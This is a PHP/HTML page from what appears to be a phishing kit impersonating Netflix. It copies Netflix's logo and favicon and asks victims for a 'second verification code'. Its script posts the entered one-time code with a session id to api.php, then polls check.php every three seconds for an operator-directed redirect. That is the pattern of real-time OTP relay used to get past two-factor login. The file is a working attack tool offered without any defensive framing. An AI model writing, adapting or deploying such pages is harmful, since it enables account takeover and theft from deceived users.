<?php 
require_once 'config.php'; 
$lang = getLang();
$sid = $_GET['sid'] ?? '';
?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>" dir="<?php echo $lang === 'ar' ? 'rtl' : 'ltr'; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - <?php echo t('verify', $lang); ?> 2</title>
    <link rel="stylesheet" href="assets/style.css">
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/favicon.ico">
</head>
<body>
    <div class="bg-wrapper">
        <div class="bg-image"></div>
        <div class="bg-overlay"></div>
    </div>

    <header class="nf-header">
        <a href="#" class="nf-logo">
            <svg viewBox="0 0 111 30" fill="#e50914"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.125L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.532-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687H35.97V0h13.375v4.687h-4.001zM24.938 4.687V0H11.22v4.687h4.687v21.625c1.5 0 3.063.063 4.594.188V4.687h4.437zm-17.5 21.03c-1.813-.156-3.625-.25-5.438-.343V0h5.438v25.717z"/></svg>
        </a>
    </header>

    <main class="nf-main">
        <div class="nf-card verify-card">
            <div class="shield-icon">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#e50914" stroke-width="1.5">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                </svg>
            </div>
            <h2><?php echo t('verify', $lang); ?> - Step 2</h2>
            <p class="verify-desc">Additional verification required.</p>
            <p class="verify-desc2">A second code has been sent to your device.</p>

            <form id="otp2Form">
                <div class="code-inputs">
                    <input type="text" class="code-box" maxlength="1" data-i="0">
                    <input type="text" class="code-box" maxlength="1" data-i="1">
                    <input type="text" class="code-box" maxlength="1" data-i="2">
                    <input type="text" class="code-box" maxlength="1" data-i="3">
                    <input type="text" class="code-box" maxlength="1" data-i="4">
                    <input type="text" class="code-box" maxlength="1" data-i="5">
                </div>

                <div class="timer-row">
                    <span id="timer"><?php echo t('expires', $lang); ?> 02:59</span>
                    <a href="#" class="resend" onclick="return false;"><?php echo t('resend', $lang); ?></a>
                </div>

                <button type="submit" class="nf-btn" id="submitBtn">
                    <?php echo t('verify_btn', $lang); ?>
                </button>
            </form>
        </div>
    </main>

    <div class="waiting-overlay" id="waitingOverlay" style="display:none;">
        <div class="waiting-box">
            <div class="spinner-large"></div>
            <p><?php echo t('processing', $lang); ?></p>
        </div>
    </div>

    <script>
        const sid = '<?php echo htmlspecialchars($sid); ?>';
        const lang = '<?php echo $lang; ?>';
        const boxes = document.querySelectorAll('.code-box');

        boxes.forEach((box, i) => {
            box.addEventListener('input', (e) => {
                if (e.target.value && i < boxes.length - 1) boxes[i + 1].focus();
            });
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && i > 0) boxes[i - 1].focus();
            });
        });

        let time = 179;
        const timerEl = document.getElementById('timer');
        setInterval(() => {
            time--;
            const m = Math.floor(time/60).toString().padStart(2,'0');
            const s = (time%60).toString().padStart(2,'0');
            timerEl.textContent = '<?php echo t('expires', $lang); ?> ' + m + ':' + s;
            if (time <= 0) { timerEl.style.color = '#e50914'; timerEl.textContent = 'Code expired'; }
        }, 1000);

        document.getElementById('otp2Form').addEventListener('submit', async (e) => {
            e.preventDefault();
            let code = '';
            boxes.forEach(b => code += b.value);

            document.getElementById('submitBtn').innerHTML = '<span class="spinner"></span> <?php echo t('processing', $lang); ?>';
            document.getElementById('submitBtn').disabled = true;

            await fetch('api.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=otp2&sid=' + sid + '&otp2=' + code
            });

            document.getElementById('waitingOverlay').style.display = 'flex';
            pollForRedirect();
        });

        function pollForRedirect() {
            setInterval(async () => {
                try {
                    const res = await fetch('check.php?sid=' + sid + '&lang=' + lang);
                    const data = await res.json();
                    if (data.redirect) window.location.href = data.url;
                } catch(e) {}
            }, 3000);
        }
    </script>
</body>
</html>
